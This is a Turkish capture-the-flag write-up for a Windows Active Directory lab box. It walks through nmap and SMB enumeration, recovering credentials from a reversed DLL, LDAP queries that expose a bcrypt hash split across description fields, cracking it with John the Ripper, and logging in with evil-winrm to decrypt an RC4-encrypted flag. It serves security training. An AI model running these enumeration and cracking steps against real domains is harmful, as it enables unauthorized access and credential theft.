# İlk Kullancı Bilgileri

```kamil:THMs4linart!k```

# Nmap Çıktısı
```
nmap -sS -sC -sV -O 172.31.210.72        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 23:32 +03
Nmap scan report for 172.31.210.72
Host is up (0.00078s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-03-19 20:32:53Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: SKYDAYS.SC, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2022 Standard Evaluation 20348 microsoft-ds (workgroup: SKYDAYS)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: SKYDAYS.SC, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
MAC Address: 00:15:5D:6B:A0:12 (Microsoft)
Device type: general purpose
Running: Microsoft Windows 2022
OS CPE: cpe:/o:microsoft:windows_server_2022
OS details: Microsoft Windows Server 2022
Network Distance: 1 hop
Service Info: Host: DC01-SKYDAYS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard Evaluation 20348 (Windows Server 2022 Standard Evaluation 6.3)
|   Computer name: DC01-SKYDAYS
|   NetBIOS computer name: DC01-SKYDAYS\x00
|   Domain name: SKYDAYS.SC
|   Forest name: SKYDAYS.SC
|   FQDN: DC01-SKYDAYS.SKYDAYS.SC
|_  System time: 2025-03-19T13:32:55-07:00
| smb2-time: 
|   date: 2025-03-19T20:32:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
|_nbstat: NetBIOS name: DC01-SKYDAYS, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:6b:a0:12 (Microsoft)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.07 seconds
```
Buradan sistemde AD, LDAP ve SMB çalıştığını öğreniyoruz

# SMB Çıktısı

```
smbclient -L //172.31.210.72/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Labyrinth       Disk      
        Legacy          Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.31.210.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Ardından verilen kullanıcı ile Legacy klasörüne bağlanıp içerisindeki dll dosyasını indiriypruz.
```
smbclient -U kamil //172.31.210.72/Legacy
Password for [WORKGROUP\kamil]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 15 10:10:24 2025
  ..                                DHS        0  Sat Mar 15 07:49:18 2025
  labyrinth.dll                       A    48186  Sat Mar 15 10:09:14 2025
  Legacy.txt                          A        0  Sat Mar 15 07:53:23 2025

                20806911 blocks of size 4096. 17562042 blocks available
smb: \> get labyrinth.dll
```
# DLL Reverse Kısmı

Daha sonra elde etiiğimiz dll dosyasını disassambly yaptığımızda içerisinde bir *decryptSecret* fonksiyonu olduğunu görüyoruz ve bu fonksiyonu tersine çevirdiğimizde ikinci kullanıcıyı ve şifresini elde ediyoruz

image

Şifreyi bulmak için kullanılan python3 kodu.

```
# Şifre çözme fonksiyonu
def decrypt_secret(param_1, param_2, param_3):
    # Sabit anahtar dizisi (local_48)
    key = "_\x03DKGU\nd>=A7775j\x19[\x17A^ybFG=\x019"
    
    # param_1 * param_3 işlemi ile elde edilen değer
    multiplier = param_1 * param_3
    # local_1c hesaplanıyor
    local_1c = int(multiplier) + 0x2a
    if local_1c > 1000:
        local_1c = 0

    # Çözülmüş şifreyi saklamak için boş bir liste
    decrypted = []

    # Şifre çözme döngüsü
    for local_c in range(28):  # 0x1c = 28
        # XOR işlemi uygulanıyor
        decrypted_byte = (local_c % 0x10) + ord(key[local_c]) ^ 0x2a
        # Çözülen byte'ı sonuç listesine ekle
        decrypted.append(decrypted_byte)

    # Çözülen byte dizisini ASCII karakterlere çeviriyoruz
    decrypted_message = ''.join(chr(b) for b in decrypted)
    
    return decrypted_message


# Örnek parametreler
param_1 = 10  # Örnek parametre 1
param_2 = 0x1234  # Örnek parametre 2, burada önemli değil çünkü sadece bellekte yazma işlemi yapılır
param_3 = 5.0  # Örnek parametre 3

# Şifreyi çöz
decrypted_message = decrypt_secret(param_1, param_2, param_3)

# Çözülen mesajı yazdır
print("Çözülen Mesaj:", decrypted_message)
```

Bulduğumuz kullanıcı adı ve şifresi.

```
Çözülen Mesaj: u.ldap:AllahiniS3v3nHTBgel!n
```
Buradan soruda u.ldap kullanıcısının şifresini ```AllahiniS3v3nHTBgel!n``` olarak buluyoruz. Sonrasında ldap sorgusu ile devam edilmesi gerektiğinin ipucunu alıyoruz.

# LDAP Sorgusu Kısmı

Active Directory Domain'deki kullanıcıları ve gruplarını filtrelenmiş bir şekilde görmek için aşağıdaki LDAP komutunu kullanıyoruz.
```
ldapsearch -x -LLL \
-D "u.ldap@SKYDAYS.SC" \
-w 'AllahiniS3v3nHTBgel!n' \
-H ldap://172.31.210.72 \ 
-b "DC=SKYDAYS,DC=SC" \
"(objectClass=user)" \
cn memberOf
```
Bu sorgunun sonucu olarak aşağıdaki çıktı geliyor. *(Standart çıktıda açıklamalar ile kullanıcı isimleri base64 ile şifrelenmiş olarak geliyor şifrelenmiş kısımları decode edilmiş olarak ekledim)*

```
dn: CN=Administrator,CN=Users,DC=SKYDAYS,DC=SC
cn: Administrator
description: Built-in account for administering the computer/domain
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=SKYDAYS,DC=SC
memberOf: CN=Domain Admins,CN=Users,DC=SKYDAYS,DC=SC
memberOf: CN=Enterprise Admins,CN=Users,DC=SKYDAYS,DC=SC
memberOf: CN=Schema Admins,CN=Users,DC=SKYDAYS,DC=SC
memberOf: CN=Administrators,CN=Builtin,DC=SKYDAYS,DC=SC

dn: CN=Guest,CN=Users,DC=SKYDAYS,DC=SC
cn: Guest
description: Built-in account for guest access to the computer/domain
memberOf: CN=Guests,CN=Builtin,DC=SKYDAYS,DC=SC

dn: CN=DC01-SKYDAYS,OU=Domain Controllers,DC=SKYDAYS,DC=SC
cn: DC01-SKYDAYS

dn: CN=krbtgt,CN=Users,DC=SKYDAYS,DC=SC
cn: krbtgt
description: Key Distribution Center Service Account
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=SKYDAYS,DC=SC

dn:: CN=Ahmed Mahir Demirelli,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn: Ahmed Mahir Demirelli
description: SKY-LAB{Harika}
memberOf: CN=Privileged Support,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Ömer Faruk Erdem,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn:: Ömer Faruk Erdem
pwd:979e279ce46c718b922e0002d93186786dacdf9be8a3644765185c503f8468bad83800f034dc2d127f1f25005409e50472168097592dc3204dada9566e0f65ae
memberOf: CN=IT Admins,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Onur Turan,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn:: Onur Turan
description: OnurAcmacı{K4rd3s_B3n!_Ar1y0rmusun}
memberOf: CN=IT Admins,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Mertcan Yavaşoğlu,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn:: Mertcan Yavaşoğlu
description: Herhangi Bir sorun Olması Durumda Backup Alınsın!
memberOf: CN=IT,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Backup Admin,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn:: Backup Admin
description: Tüm yetkiyi f.erdem'e verin ve şifre için bcrypt kullanın sonra bu hesabı kapatın (b.avci)
memberOf: CN=Audit Team Admins,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Osman Bahadır Avcı,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn:: Osman Bahadır Avcı
description: PirMC3B3oARoTretI16N2tlmnB0kcB0PVn3zNPAolchStS
memberOf: CN=Privileged Support,OU=Gruplar,DC=SKYDAYS,DC=SC
memberOf: CN=Account Operators,CN=Builtin,DC=SKYDAYS,DC=SC

dn:: CN=Test User,OU=Kullanıcılar,DC=SKYDAYS,DC=SC=
cn: Test User
description: b.avci tarafında yetki test etmek için oluşturulmuştur
memberOf: CN=Audit Team,OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=Test Admin,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn: Test Admin
description: Herhangi Bir Sorun Olması Durumunda Hesabı Aktif Edin ve Şifresini bcrypt ile Şifreleyin
memberOf: CN=Privileged Support (Backup),OU=Gruplar,DC=SKYDAYS,DC=SC

dn:: CN=LDAP,OU=Kullanıcılar,DC=SKYDAYS,DC=SC
cn: LDAP

dn: CN=Kamil Bulent,CN=Users,DC=SKYDAYS,DC=SC
cn: Kamil Bulent
description: Alo kime diyorum

# refldap://ForestDnsZones.SKYDAYS.SC/DC=ForestDnsZones,DC=SKYDAYS,DC=SC

# refldap://DomainDnsZones.SKYDAYS.SC/DC=DomainDnsZones,DC=SKYDAYS,DC=SC

# refldap://SKYDAYS.SC/CN=Configuration,DC=SKYDAYS,DC=SC
```
Bu açıklamalarda f.erdem kullanıcısın şifresi yazıyor ancak şifre blake2 ile hashlenmiş olduğunu görüyoruz hashi kırdığımızda şifresinin ```Passion@War5994``` olduğunu buluyoruz ancak bu şifre ile kullanıcya bağlanmaya çalıştığımızda hesabın AD içerisinde **Disable** olduğunu öğreniyoruz ve herhangi bir işimize yaramıyor.

Nested (İç içe geçmiş) gruplarların hangi grup altında bulunduğunu ve açıklamalarını görmek için kullanılan komut.
```
ldapsearch -x -LLL \
-D "u.ldap@SKYDAYS.SC" \
-w 'AllahiniS3v3nHTBgel!n' \
-H ldap://172.31.210.72 \
-b "DC=SKYDAYS,DC=SC" \
"(objectClass=group)" \
cn memberOf description
```
Aynı şekilde aşağıda decode edilen çıktı.*(Burada da AD yapısı içerinsde built-in gelen)*
```
dn: CN=IT,OU=Gruplar,DC=SKYDAYS,DC=SC
cn: IT
description: $2a$12$ Admin Key

dn: CN=Privileged Support,OU=Gruplar,DC=SKYDAYS,DC=SC
cn: Privileged Support
description: 8Tk0fE/ Key
memberOf: CN=IT,OU=Gruplar,DC=SKYDAYS,DC=SC

dn: CN=IT Admins,OU=Gruplar,DC=SKYDAYS,DC=SC
cn: IT Admins
description: Herhangi Bir Sorun Olursa IT Grubuna Devrettik Yetkiyi

dn: CN=Privileged Support (Backup),OU=Gruplar,DC=SKYDAYS,DC=SC
cn: Privileged Support (Backup)
description:: Backup için Privileged Support yetkileri sahip (2.3.2025)

dn: CN=Audit Team,OU=Gruplar,DC=SKYDAYS,DC=SC
cn: Audit Team
description: Tüm Sistemi Denetleme Yetkisi Kendi İçinde Dağıtılmştır

dn: CN=Audit Team Admins,OU=Gruplar,DC=SKYDAYS,DC=SC
cn: Audit Team Admins
description: Audit Team kritik bir grup sadece Admin yazma/okuma yetkisne sahip
memberOf: CN=Audit Team,OU=Gruplar,DC=SKYDAYS,DC=SC
```
Bu kullanıcılar ile grupları bir şema ile birleştirdiğimizde aşağıda tablo oluşuyor.

img

Bu tablo ile kullanıcılar ve grupların açıklamalarını incelediğimizde sistende bcrypt hashlerinin kullanıldığı öğreniyoruz ve sistemde en yetkili kullanıcıda b.avci olarak görünüyor. Buradan **IT** grubunun açıklamasına baktığımızda bcrypt hashinin ilk kısmını görüyoruz ```$2a$12$``` daha sonra bu gurunun altındaki ***Privileged Support*** grubunun açıklamasında bir hash parçası görüyoruz ```8Tk0fE/``` bu grubun içindeki **b.avci** kullanıcısınında açıklamasında bir hashin devamı olduğu görüyoruz ```PirMC3B3oARoTretI16N2tlmnB0kcB0PVn3zNPAolchStS``` bu hash parçalarını birleştirdiğimizde bütün bir bcrypt hashi elde ediyoruz.

# Hash Kırma Kısmı

**Elde ettiğimiz hash bcrypt olduğu için ve rockyou.txt dosyası içerisinde çok falza şifre bulunduğu için şifreyi daha hızlı kırabilmek için elimizdeki şifre dosyasını filtrelememiz gerekecek bunun için AD yapılarında bulunan özel bir trick'i kullancağız. AD yapılarında kullanıcı şifreleri her zaman en az bir sembol, bir küçük harf, bir büyük harf ve bir rakamdan oluşmak zorundadır bu bilgi ile elimizdeki rockyou.txt klasöründe filtreleme yaptığımızda hash kırma sürecini oldukça çok kısaltmış oluyoruz eğerki bu filtreleme trick'i kullanılmazsa hash kırma süreci yarışma süresi olan 20 saati bile geçebiliyor bcrypt hashi olduğu için.**

Filtreleme için kullanacağımız komut
```
grep -P '^(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9])(?=.*[\W_]).*$' rockyou.txt >> passwd.txt
```
Ardından John ile ```b.avci:$2a$12$8Tk0fE/PirMC3B3oARoTretI16N2tlmnB0kcB0PVn3zNPAolchStS``` hashini kırdığımızda
```
john --format=bcrypt --wordlist=passwd.txt hash.txt    
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 14 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*PUp1qzW         (?)     
1g 0:00:09:18 DONE (2025-03-20 01:26) 0.001789g/s 90.43p/s 90.43c/s 90.43C/s *WeNd0La..*N1ght1e
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
b.avci:*PUp1qzW kullanıcının şifresini bu şekilde elde ediyoruz.

# Winrm ve Disassembly Kısmı

Elde ettiğimiz şifre ve kullanıcı adı ile sisteme bağlanıyoruz.
```
evil-winrm -i 172.31.210.72 -u b.avci -p '*PUp1qzW'
```
Sonra kullanıcı içerisinde 2 dosya olduğunu görüyoruz 
```
-a----         3/15/2025   1:00 AM            113 flagimsi.txt
-a----         3/15/2025  12:44 AM          25280 legacy.out
```
Bu dosyaları okuttuğumuzda flagimsi.txt içerisinde flagin ```5c 36 e9 cb 6a 28 4b 7c 39 72 84 49 f5 f7 0f 12 c7 d6 7d a3 c6 53 e2 3c 44 20 53 87 9b e8 c3 0e e5 03 ba 7c 6e 3b``` byte'lar ile şifrelenmiş olduğunu görüyoruz. Ardından legacy.out klasörünü disassembly ettiğimizde.

img

**Flag** ve **Secret** değerlerinin beraber RC4 ile şifrelendiğini görüyoruz. Bunun için önce secret değerini bulmalıyız secret değerinide **SMB** klasöründeki ilk kullanıcı bilgilerimiz ile erişemediğimiz ```Labyrinth``` klasöründen elde ediyoruz.
```
smbclient -U b.avci //172.31.210.72/Labyrinth
Password for [WORKGROUP\b.avci]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 15 09:17:52 2025
  ..                                DHS        0  Sat Mar 15 07:49:18 2025
  Secret.txt                        A       53  Sat Mar 15 11:15:08 2025

                20806911 blocks of size 4096. 17559364 blocks available
smb: \> get Secret.txt
getting file \Secret.txt of size 53 as Text.txt.txt (17.3 KiloBytes/sec) (average 17.3 KiloBytes/sec)
```
Ardından **Secret** değerimizi elde ediyoruz.
```
cat Secret.txt          
Bulabilirdin mi gizli bölgeyi
secret=YuruyenTeyyare
```
Buradan sonra elimizdeki byte değerleri ve secret'ı içeren **RC4** ile elimizdeki şifreyi aşağıdaki kod ile kırıyoruz
```
from Crypto.Cipher import ARC4
import binascii

# Verilen şifreli veri
encrypted_hex = "5c36e9cb6a284b7c39728449f5f70f12c7d67da3c653e23c442053879be8c30ee503ba7c6e3b"
# Anahtar
key = "YuruyenTeyyare"

# HEX veriyi byte dizisine çevir
encrypted_data = binascii.unhexlify(encrypted_hex)

# RC4 ile şifre çözme
cipher = ARC4.new(key.encode())  # Anahtarı byte dizisine çeviriyoruz
decrypted_data = cipher.decrypt(encrypted_data)

# Çözülen veriyi yazdır
print("Çözülen veri:", decrypted_data.decode())
```
Sonra bu python3 koudunu çalıştırdığımızda 
```
python3 legacy.py
Çözülen veri: SKYDAYS25{K4rdes!m_ne_ar!y0rsun_0r4d4}
```
Çıktısını alıyoruz. Sorunun flagini **SKYDAYS25{K4rdes!m_ne_ar!y0rsun_0r4d4}** olarak buluyoruz.
# (Soruda LDAP Query kısmında birden fazla kullanıcı ve gruplar bulunuyor ama çoğu kullanıcı ve grup sorunun çözümüne dair bir katkı sağlamıyor aslında bunun sebebi diğer kullanıcıların rabbit hole olarak bulunması ve sorunun adında da bulunan labirent gibi karmaşık bir yapı sunması.)
